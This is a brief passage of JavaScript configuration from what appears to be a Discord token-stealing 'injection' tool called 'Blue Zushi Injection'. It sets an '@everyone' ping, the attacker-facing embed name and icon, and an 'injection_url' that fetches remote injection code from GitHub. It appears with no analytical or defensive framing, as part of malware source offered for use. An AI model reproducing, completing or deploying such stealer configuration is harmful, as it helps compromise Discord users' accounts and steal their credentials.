...
const config = {
  ...
  ping_on_run: false, 
  ping_val: '@everyone', 
  embed_name: 'Blue Zushi Injection', 
  embed_icon: 'https://raw.githubusercontent.com/BlueZushi/Blue-Zushi-Injection/main/imgs/pfp.png', 
  embed_color: 0, 
  injection_url: 'https://raw.githubusercontent.com/BlueZushi/Blue-Zushi-Injection/master/injection.js', 
